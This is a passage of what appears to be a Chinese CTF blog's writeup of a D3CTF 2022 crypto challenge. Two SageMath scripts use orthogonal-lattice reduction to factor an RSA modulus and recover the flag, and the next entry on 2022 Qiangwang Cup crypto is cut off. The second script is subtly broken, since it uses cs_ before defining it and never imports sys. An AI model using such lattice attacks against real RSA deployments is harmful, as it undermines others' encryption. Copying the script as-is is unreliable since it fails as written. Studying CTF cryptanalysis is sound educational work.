href="https://github.com/D-3CTF/D3CTF-2022-Official-Writeup/blob/main/Official%20Writeup.pdf">wp</a>中找到其中正交格的构造函数，利用之成功复现，得以一窥flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> gmpy2,sys</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">orthogonal_lattice</span>(<span class="params">B</span>):</span></span><br><span class="line">    LB = B.transpose().left_kernel(basis=<span class="string">&quot;LLL&quot;</span>).basis_matrix()</span><br><span class="line">    <span class="keyword">return</span> LB</span><br><span class="line"></span><br><span class="line">n = <span class="number">99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class="line">N = <span class="number">81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">enc = <span class="number">2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class="line"></span><br><span class="line">cs = [<span class="string">b&quot;\x17\x8bb3\x11\x1b\xb9\xb9\xc6M\xb0\xaa\x07-\x1ar\xff\xfb\xb4&amp;H7!\xb8\xa1\xce\x07\x8b\x84M\x0bw=m\x193Oc\x97w\x8f\xffy4\xa1\x99\xfcW\xf9|\xeb\xa4\x00\x1eD*\xe8-&#x27;\xa9\xef\x9d\x13*\xf4\xbe\x9d\x9b&amp;w\xcb\xfd\xb3\xb6\xa3n\xb8\xb4\x97vT\xec@\x86\xd1R\xb0\n\xe1uC\xbc\x14\xeb\xceSu&amp;&#x27;&#123;\xb9\x12\x90\x82\xc7,\xdbr\xebP\xe1j\x11E\xd5\x17\xe1\xd0D\xe7z\x94vt\xbf\x1a\xc4+&quot;</span>,</span><br><span class="line"><span class="string">b&#x27;\x1dJ\xc5\xb2\xbe\x05\xe6\xc8T\n\xbe&quot;\xbeU\xed\xba\xec\x85\x05\x8b\x8ayE\xa3&#125;0\x1dk\xa7\x10\xe2E\x19\xfe\x10\x90\xef\r\xdbV\x8b\x87|(\xd1\xb5\xfd\xb9\x14\x84\x05\x03\x81\xc8\xf6\xe5\x8a\x92\xa0\x01I\x8aG:\xc19\x9e\xf0\x8eZ\\Yx\x80|\xb7\x80\x0e\xcd\xa3\xba6\xf8\x98\xb1pB\x05\x8aT#\xbf\x1e\x1b~\xcb\xf5\t\xa2H9\xc9n\x81e\xa2\x15\x97\x11\xe4\x93\xf2\xe6\x80\x97\x99G\xb5\xfe\x07/\xd2\xbd\xad\xcf\x04\x9e\xd0&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;Gs\xda\xb8\x8a\x85\xccK\xf7\xa8y\x16\xa5\xf0\x06\xbe\xeb\x83&amp;&#125;a\x85q\x8d:\x1fSb\xb8\xc5\x84\xba*[\xe7\xbb&#123;\x86\xd3\xb3r\xb6\xaaCN\x93\x1d&lt;(\xe2\x1c;\x8crU\x8fD=W\xa7\x0b\xc7\xeag\x96\x06\xd6\xbb\xe4\x04b\xd8\x02\x12\xd6\xfa2\x1e#\xf0\xde\x8b\x88M\xd2\xf47\\\x98\xe0\x04Fu\x1bsy\xf2\xc4\xad\xd6Y\x81u~B:\xd2\x1f\xb3\xab\x01:\xfa\xdf\x19J8\xd0\x18RN\xfe,CA\x15\xb3\xe0&#x27;</span>,</span><br><span class="line"><span class="string">b&quot;0I\xda5\x9f\x05v\x17\xdc\xd4q\xd6\x83,\x9d\r\xccc\x8a\xa1\xd4U\xd3\x18\xc9\xc6g\xcd\nX\x99Ah\xed&#125;\xf3\xb1(\xd5I\xc6\x0f@yw9\x9d\xfdv\x15x\xeaRA\xd6\xb0\x1e\xb5B\xe5\x05cc\x06m\xf4NN&#x27;\x02q\x1a\x11\xe4\x87P:\xc8\x11a\x9f\xbd\x9c\x98x\xda\xea\xc4\xa8f\x89s\xcaJ\x7f\xeb\xd8\xc1G#\xf4\xdc\xe2\x01\xf2\xa5\x95\x19`)2!\xf5\xb9\xf0\xf2\xbb\xf8\x0bF&amp;&amp;`\xfd*\xe1\xf2\x9c&quot;</span>,</span><br><span class="line"><span class="string">b&#x27;:\x99/Hxt\xd1\xd4\xaaB\xd6H\x16\xe1\xc9\xe2\xb3\xc3\xa9b\xd3\x96\x9c\x05x6\xf1\xc3d\xa2\xd1U+.\x1b\xac^\xf6Mh7\xb7\x03\x8e\xdc\xca\x0bn\xac\xed\x92\xb8x\x04)\x0f|\x11\xcc\xfa\xf2\\\xba\xee\xc4X\xa8(\x05\xf2\xb5\x8f&amp;\xf3\xff\x1eB\xe7\x94\xf4\xa6\x00!\xe5v\xd9x\xf0s\x94\xf4D(\xa9g\x118\xa7z\x83\xad\xdb\xe6\xe3\xe7\xf8\xf2\xef\xe5@\xe9\x13\x00OB\xcc\x05\xd1,_=\xd2/Og\x81\xa6+&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;\x1c|\xb6\xcc\xdfj\xc5\xa0s\xac w\xa6\xf2\x87D\xe3\xf9Y\xf5=\xf0\x0b\xd9\xea\x89,+e\x1e\xb7m#\x99\xd1\x87\x17Z\xed\x1d\xc8\x97;\xa0K\x05.\xaa&lt;\xc6s\xcf\xa2\xa2\\PO\x12&amp;\xb4\x11\xec\xad\x10\xf8\xf7\xd1\xd3_\x80\x17\xe0\x1eP\x93\xe3\xc2\x1e\x03\xea]^\xc6a\x9c\xcb\x90\xbb\x9f\x8by\xa5dhM\xce\xc7\xbc\xf7\xafe\xcf\xc1\xf1\x18@\x1e\xe2\xdb\xfb\xe4^\xc8\xe7\x19\xccnY\xc6o\x7fL\x9fV\xd4\xc4\x15\xe8&#x27;</span>]</span><br><span class="line"></span><br><span class="line">s = [<span class="string">b&#x27;\t\x8b\xde\x98\x84\x1d\x9e\xd4\xa0\xb7f\xe0\x05\xb1\xbd8\xb9G\xe3\x0c\x83\x8a\xe5\xf0G7\x12\x1eT\x85o-B\xe4_\xd2\x04\xd9:\xab\xdf\xa1 \x8f\xedt+\x0f\xce\xb5\x90\xaaK\xf0U~v=\x84\xe7$G\xf5\xfb\xd3ok~V\x1a\xec&amp;\x15\x18Y\x0c\x80u\xafF\xf1\x10\x9f\xf2\xe6\xa6\x9a\xbb\xbd+\xa4l\xa9\x11\xd5\t\x13\x16\xa3\xde\xe1\xdfZ\xa9$r\xb5`\xc9&quot;\x11\xab\xc5\x87\xc4\x1d@\x9e\xa4t\xdb#\xbdj\xcb\x95\xefK&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;z/\xd6\xfb\xd8\xfa\xc4\xed\xbd\x99\xd0\xa0\x90\xcb\xca\x83\xd8B\xa7\xf4\xbd\xe0\xc2&amp;\x1aQl(\xd6p\x8f\x89=tT\xf1(\xeb\xab\x84[oR\x1fl=\xda\xf5\x18q\x8f\xa7k\x00\x1b\x1a\x0ei\x1fa.ho\x15\x04\x12\xe4\xc2\xd7\x19\x92\xc3\x9b\xfe\xd5\xb6R\xf8\x95\x9fr\x93\xddD\x1c[\x873\xd5\x06\x1b\xa5\x82/6\x9a\x13\xcf\xa4\xcd\x0e]\t\xad?\xd6\x84\r\x90\xef\x86\xf15)\xe34\xf7\xb77\xef\x0c&amp;\xdb8\xa6\xe0\xa5a&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;U\x0b\xf6\x9cm])1\xe2\xad\xf9G\x8f\xa2\xbc&#125;\xd7\x18\x89\xa4\xfdFQ\x80m&quot;\xf9\to^\xd9A\x98\xd2\xca\x1e(b\xa8\xbe\xc2m\xf7\n[O\x00\xbc\x87\x17\xed\x0cG\xf2=H\x0e\xc0\x14+\xcb\xd0\x1feT2\xf2Th\xec\xc2\xcf&gt;6,&lt;\x88X\x8f\xe9g\xa8\x00\xafr\x05\x95\rj\x9c\xc6\n\xbb\x8a\x019\xc1\x1ef#\x02[Rh\xd8\xdc|&#123;6\xeb\xe8U\x91\xa4\xeb&#125;\xf4s;E\xe72$i\xdft\xff\&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;[\x94\x95T\xf4\xc4\xca\x8drO\x80\x14\xc9&lt;H\xa2a\xdc\xf4`\xac&gt;\xab\x03\xfa\x80Sx\x99\x14\x83$U\x0b\xfa\x8fv\xfd\xda\x1a\xa0\xebY\xaa\x01\xe2XsG\t\xcf\xae\xa0\xbf\x82iG\tQ \xb1\xfe\xa5k\x12\xd9\x12\xf7\x95\xa3\xa5\x8d`z\x19\x1a\x90-\x9aj\x15\xf6f&gt;\x18\x08\xb8\x1f\x88\x1a\x80Th\xd0\x15\x9bw#\&#x27;`K\xa5\xf1\xbf&quot;\xe79\xaf\xc7z%p\xa5\x9f\x14\xef\&#x27;1\x11\x05Gg\xe9\xda\xc9\x18~[&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;:\xefRE\xd7\xa1?\xf3\xb5\xf7\xdd\xe2\xb6~\x85014\xc0\x8a\x80\xe1\xb5#\x94\x10\xb2\xa0\xfe\x87\xd1t\xc3$&amp;\xde8\x195\xcd\xf4@3\x15\xcaK\xcc\xcd\r:\x83*\xd7l\xb6\xf2&#125; \tJ\xb5xKfjh.\xfb\xb5\x91\xc6\xf2x\x8e\x83\xdc\xc3\xef\x8b\x8dW\xa6\xa6\xb0w\xd8\xf2G\xa5-\xc3\x87\x17;\xedH`:\xcd\x08ts\x9eqPE\xd7\xfc\xc4\x98\xb5\xe0\xad\xb7A\x7f\xcb\x01\xbd\x98\xd3Ea\xb9\x07\x80\xf8\x19&#x27;</span>,</span><br><span class="line"><span class="string">b&quot;8\xca\x7f!;\\\xde\x1b\x80i\x9b!\x1c??u\x13\x955\xd0xG\xff\xd7\xba\xfe+\x95\x0eu^\x15\x1a\x0e*\xfe\x8a\xafM\xc0\xd1Ty\xd7\xf1\xa7@\xd6\xa6\xee\x0c:It\x1a\xeag\xfc\x0c\xaf\x02&lt;\x03T)\xeb\xb0\x15\x1cz\x85\x992\xa9\xbe\x9bm\xc4D\x83\xf7\xb5T\xdd9?\x94\xd4\x13\xb4\xb3\x8d\xa9\x92\x9dt\x86\xdb\x0b$\x19l\xb1\xb9\x05&#x27;o\xf3!\t\x01\x93&#x27;z\x15P\x88\xd7iN\n\x8bA\xb5\xd2&#125;\xe8\x10&quot;</span>]</span><br><span class="line"></span><br><span class="line">cs_ = [libnum.s2n(i) <span class="keyword">for</span> i <span class="keyword">in</span> cs]</span><br><span class="line">s_ = [libnum.s2n(i) <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line">v = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cs_)):</span><br><span class="line">    v.append(<span class="built_in">int</span>(crt([s_[i], cs_[i]], [n, N])))</span><br><span class="line">    </span><br><span class="line">v = vector(ZZ, v)</span><br><span class="line">Lv = orthogonal_lattice(Matrix(v))</span><br><span class="line">L1 = orthogonal_lattice(Lv.submatrix(<span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>-<span class="number">2</span>, <span class="number">6</span>))</span><br><span class="line">x, y = L1</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">333</span>)):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">333</span>)):</span><br><span class="line">        z = a*x+b*y</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> (v-z):</span><br><span class="line">            tmp =  gcd(each,n)</span><br><span class="line">            <span class="keyword">if</span> tmp&gt;<span class="number">1</span>:</span><br><span class="line">                p = tmp</span><br><span class="line">                q = n // p</span><br><span class="line">                d = <span class="built_in">int</span>(gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line">                <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(enc,d,n))))</span><br><span class="line">                sys.exit()</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;34bf3913-5c26-4deb-a281-0f89d8bd8a83&#125;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{34bf3913-5c26-4deb-a281-0f89d8bd8a83}</p></blockquote><hr><h3 id="论文解"><a href="#论文解" class="headerlink" title="论文解"></a>论文解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class="line">N = <span class="number">81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">enc = <span class="number">2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class="line"></span><br><span class="line">cs = [<span class="string">b&quot;\x17\x8bb3\x11\x1b\xb9\xb9\xc6M\xb0\xaa\x07-\x1ar\xff\xfb\xb4&amp;H7!\xb8\xa1\xce\x07\x8b\x84M\x0bw=m\x193Oc\x97w\x8f\xffy4\xa1\x99\xfcW\xf9|\xeb\xa4\x00\x1eD*\xe8-&#x27;\xa9\xef\x9d\x13*\xf4\xbe\x9d\x9b&amp;w\xcb\xfd\xb3\xb6\xa3n\xb8\xb4\x97vT\xec@\x86\xd1R\xb0\n\xe1uC\xbc\x14\xeb\xceSu&amp;&#x27;&#123;\xb9\x12\x90\x82\xc7,\xdbr\xebP\xe1j\x11E\xd5\x17\xe1\xd0D\xe7z\x94vt\xbf\x1a\xc4+&quot;</span>,</span><br><span class="line"><span class="string">b&#x27;\x1dJ\xc5\xb2\xbe\x05\xe6\xc8T\n\xbe&quot;\xbeU\xed\xba\xec\x85\x05\x8b\x8ayE\xa3&#125;0\x1dk\xa7\x10\xe2E\x19\xfe\x10\x90\xef\r\xdbV\x8b\x87|(\xd1\xb5\xfd\xb9\x14\x84\x05\x03\x81\xc8\xf6\xe5\x8a\x92\xa0\x01I\x8aG:\xc19\x9e\xf0\x8eZ\\Yx\x80|\xb7\x80\x0e\xcd\xa3\xba6\xf8\x98\xb1pB\x05\x8aT#\xbf\x1e\x1b~\xcb\xf5\t\xa2H9\xc9n\x81e\xa2\x15\x97\x11\xe4\x93\xf2\xe6\x80\x97\x99G\xb5\xfe\x07/\xd2\xbd\xad\xcf\x04\x9e\xd0&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;Gs\xda\xb8\x8a\x85\xccK\xf7\xa8y\x16\xa5\xf0\x06\xbe\xeb\x83&amp;&#125;a\x85q\x8d:\x1fSb\xb8\xc5\x84\xba*[\xe7\xbb&#123;\x86\xd3\xb3r\xb6\xaaCN\x93\x1d&lt;(\xe2\x1c;\x8crU\x8fD=W\xa7\x0b\xc7\xeag\x96\x06\xd6\xbb\xe4\x04b\xd8\x02\x12\xd6\xfa2\x1e#\xf0\xde\x8b\x88M\xd2\xf47\\\x98\xe0\x04Fu\x1bsy\xf2\xc4\xad\xd6Y\x81u~B:\xd2\x1f\xb3\xab\x01:\xfa\xdf\x19J8\xd0\x18RN\xfe,CA\x15\xb3\xe0&#x27;</span>,</span><br><span class="line"><span class="string">b&quot;0I\xda5\x9f\x05v\x17\xdc\xd4q\xd6\x83,\x9d\r\xccc\x8a\xa1\xd4U\xd3\x18\xc9\xc6g\xcd\nX\x99Ah\xed&#125;\xf3\xb1(\xd5I\xc6\x0f@yw9\x9d\xfdv\x15x\xeaRA\xd6\xb0\x1e\xb5B\xe5\x05cc\x06m\xf4NN&#x27;\x02q\x1a\x11\xe4\x87P:\xc8\x11a\x9f\xbd\x9c\x98x\xda\xea\xc4\xa8f\x89s\xcaJ\x7f\xeb\xd8\xc1G#\xf4\xdc\xe2\x01\xf2\xa5\x95\x19`)2!\xf5\xb9\xf0\xf2\xbb\xf8\x0bF&amp;&amp;`\xfd*\xe1\xf2\x9c&quot;</span>,</span><br><span class="line"><span class="string">b&#x27;:\x99/Hxt\xd1\xd4\xaaB\xd6H\x16\xe1\xc9\xe2\xb3\xc3\xa9b\xd3\x96\x9c\x05x6\xf1\xc3d\xa2\xd1U+.\x1b\xac^\xf6Mh7\xb7\x03\x8e\xdc\xca\x0bn\xac\xed\x92\xb8x\x04)\x0f|\x11\xcc\xfa\xf2\\\xba\xee\xc4X\xa8(\x05\xf2\xb5\x8f&amp;\xf3\xff\x1eB\xe7\x94\xf4\xa6\x00!\xe5v\xd9x\xf0s\x94\xf4D(\xa9g\x118\xa7z\x83\xad\xdb\xe6\xe3\xe7\xf8\xf2\xef\xe5@\xe9\x13\x00OB\xcc\x05\xd1,_=\xd2/Og\x81\xa6+&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;\x1c|\xb6\xcc\xdfj\xc5\xa0s\xac w\xa6\xf2\x87D\xe3\xf9Y\xf5=\xf0\x0b\xd9\xea\x89,+e\x1e\xb7m#\x99\xd1\x87\x17Z\xed\x1d\xc8\x97;\xa0K\x05.\xaa&lt;\xc6s\xcf\xa2\xa2\\PO\x12&amp;\xb4\x11\xec\xad\x10\xf8\xf7\xd1\xd3_\x80\x17\xe0\x1eP\x93\xe3\xc2\x1e\x03\xea]^\xc6a\x9c\xcb\x90\xbb\x9f\x8by\xa5dhM\xce\xc7\xbc\xf7\xafe\xcf\xc1\xf1\x18@\x1e\xe2\xdb\xfb\xe4^\xc8\xe7\x19\xccnY\xc6o\x7fL\x9fV\xd4\xc4\x15\xe8&#x27;</span>]</span><br><span class="line"></span><br><span class="line">s = [<span class="string">b&#x27;\t\x8b\xde\x98\x84\x1d\x9e\xd4\xa0\xb7f\xe0\x05\xb1\xbd8\xb9G\xe3\x0c\x83\x8a\xe5\xf0G7\x12\x1eT\x85o-B\xe4_\xd2\x04\xd9:\xab\xdf\xa1 \x8f\xedt+\x0f\xce\xb5\x90\xaaK\xf0U~v=\x84\xe7$G\xf5\xfb\xd3ok~V\x1a\xec&amp;\x15\x18Y\x0c\x80u\xafF\xf1\x10\x9f\xf2\xe6\xa6\x9a\xbb\xbd+\xa4l\xa9\x11\xd5\t\x13\x16\xa3\xde\xe1\xdfZ\xa9$r\xb5`\xc9&quot;\x11\xab\xc5\x87\xc4\x1d@\x9e\xa4t\xdb#\xbdj\xcb\x95\xefK&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;z/\xd6\xfb\xd8\xfa\xc4\xed\xbd\x99\xd0\xa0\x90\xcb\xca\x83\xd8B\xa7\xf4\xbd\xe0\xc2&amp;\x1aQl(\xd6p\x8f\x89=tT\xf1(\xeb\xab\x84[oR\x1fl=\xda\xf5\x18q\x8f\xa7k\x00\x1b\x1a\x0ei\x1fa.ho\x15\x04\x12\xe4\xc2\xd7\x19\x92\xc3\x9b\xfe\xd5\xb6R\xf8\x95\x9fr\x93\xddD\x1c[\x873\xd5\x06\x1b\xa5\x82/6\x9a\x13\xcf\xa4\xcd\x0e]\t\xad?\xd6\x84\r\x90\xef\x86\xf15)\xe34\xf7\xb77\xef\x0c&amp;\xdb8\xa6\xe0\xa5a&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;U\x0b\xf6\x9cm])1\xe2\xad\xf9G\x8f\xa2\xbc&#125;\xd7\x18\x89\xa4\xfdFQ\x80m&quot;\xf9\to^\xd9A\x98\xd2\xca\x1e(b\xa8\xbe\xc2m\xf7\n[O\x00\xbc\x87\x17\xed\x0cG\xf2=H\x0e\xc0\x14+\xcb\xd0\x1feT2\xf2Th\xec\xc2\xcf&gt;6,&lt;\x88X\x8f\xe9g\xa8\x00\xafr\x05\x95\rj\x9c\xc6\n\xbb\x8a\x019\xc1\x1ef#\x02[Rh\xd8\xdc|&#123;6\xeb\xe8U\x91\xa4\xeb&#125;\xf4s;E\xe72$i\xdft\xff\&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;[\x94\x95T\xf4\xc4\xca\x8drO\x80\x14\xc9&lt;H\xa2a\xdc\xf4`\xac&gt;\xab\x03\xfa\x80Sx\x99\x14\x83$U\x0b\xfa\x8fv\xfd\xda\x1a\xa0\xebY\xaa\x01\xe2XsG\t\xcf\xae\xa0\xbf\x82iG\tQ \xb1\xfe\xa5k\x12\xd9\x12\xf7\x95\xa3\xa5\x8d`z\x19\x1a\x90-\x9aj\x15\xf6f&gt;\x18\x08\xb8\x1f\x88\x1a\x80Th\xd0\x15\x9bw#\&#x27;`K\xa5\xf1\xbf&quot;\xe79\xaf\xc7z%p\xa5\x9f\x14\xef\&#x27;1\x11\x05Gg\xe9\xda\xc9\x18~[&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;:\xefRE\xd7\xa1?\xf3\xb5\xf7\xdd\xe2\xb6~\x85014\xc0\x8a\x80\xe1\xb5#\x94\x10\xb2\xa0\xfe\x87\xd1t\xc3$&amp;\xde8\x195\xcd\xf4@3\x15\xcaK\xcc\xcd\r:\x83*\xd7l\xb6\xf2&#125; \tJ\xb5xKfjh.\xfb\xb5\x91\xc6\xf2x\x8e\x83\xdc\xc3\xef\x8b\x8dW\xa6\xa6\xb0w\xd8\xf2G\xa5-\xc3\x87\x17;\xedH`:\xcd\x08ts\x9eqPE\xd7\xfc\xc4\x98\xb5\xe0\xad\xb7A\x7f\xcb\x01\xbd\x98\xd3Ea\xb9\x07\x80\xf8\x19&#x27;</span>,</span><br><span class="line"><span class="string">b&quot;8\xca\x7f!;\\\xde\x1b\x80i\x9b!\x1c??u\x13\x955\xd0xG\xff\xd7\xba\xfe+\x95\x0eu^\x15\x1a\x0e*\xfe\x8a\xafM\xc0\xd1Ty\xd7\xf1\xa7@\xd6\xa6\xee\x0c:It\x1a\xeag\xfc\x0c\xaf\x02&lt;\x03T)\xeb\xb0\x15\x1cz\x85\x992\xa9\xbe\x9bm\xc4D\x83\xf7\xb5T\xdd9?\x94\xd4\x13\xb4\xb3\x8d\xa9\x92\x9dt\x86\xdb\x0b$\x19l\xb1\xb9\x05&#x27;o\xf3!\t\x01\x93&#x27;z\x15P\x88\xd7iN\n\x8bA\xb5\xd2&#125;\xe8\x10&quot;</span>]</span><br><span class="line"></span><br><span class="line">l = <span class="built_in">len</span>(cs_)</span><br><span class="line">cs_ = [libnum.s2n(i) <span class="keyword">for</span> i <span class="keyword">in</span> cs]</span><br><span class="line">s_ = [libnum.s2n(i) <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line">v = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    v.append(<span class="built_in">int</span>(crt([s_[i], cs_[i]], [n, N])))</span><br><span class="line">L1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    tmp = [<span class="number">0</span>]*<span class="built_in">len</span>(v)</span><br><span class="line">    tmp[i] = <span class="number">1</span></span><br><span class="line">    L1.append([s_[<span class="number">3</span>]*v[i]]+tmp)  <span class="comment"># k不能忽略（此处随便选的s_[3]）</span></span><br><span class="line">M1 = matrix(ZZ,L1)</span><br><span class="line">M2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> M1.LLL()[:-<span class="number">2</span>]:  <span class="comment"># 取前l-2 vector</span></span><br><span class="line">    M2.append(<span class="built_in">list</span>(i[<span class="number">1</span>:]))  <span class="comment"># 删每个vector第一个元素（即取每个vector后l个元素）</span></span><br><span class="line"></span><br><span class="line">M2 = matrix(ZZ, M2).transpose()</span><br><span class="line">L2 = block_matrix(<span class="number">1</span>,<span class="number">2</span>,[s_[<span class="number">2</span>]*M2,<span class="number">1</span>]).LLL()  <span class="comment"># k&#x27;不能忽略（此处随便选的s_[2]）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取L2前 2个vector，则第一个是x，另一个为y</span></span><br><span class="line">x = vector(L2[<span class="number">0</span>][-l:])  <span class="comment"># 取每个vector后l个元素</span></span><br><span class="line">y = vector(L2[<span class="number">1</span>][-l:])</span><br><span class="line">v = vector(v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">3</span>,<span class="number">3</span>):  <span class="comment"># 注意不能忽略了负整数范围，正常范围该给大些</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">3</span>,<span class="number">3</span>):</span><br><span class="line">        z = a*x+b*y</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> (v-z):</span><br><span class="line">            tmp = gcd(each,n)</span><br><span class="line">            <span class="keyword">if</span> tmp&gt;<span class="number">1</span>:</span><br><span class="line">                p = tmp</span><br><span class="line">                q = n // p</span><br><span class="line">                d = <span class="built_in">int</span>(gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line">                <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(enc,d,n))))</span><br><span class="line">                sys.exit()</span><br></pre></td></tr></table></figure><p>此刻，越发觉得Lord师傅说的对，论文题没有什么捷径，最有效的办法就是<strong>「多看论文，多试着自己构造格子」</strong></p><p>才不至于赛时对着格子都给好的论文发呆，看不明白🤧</p>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022强网杯·Crypto</title>
      <link href="/2022/08/02/2022qwb/"/>
      <url>/2022/08/02/2022qwb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a><strong>ASR</strong></h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 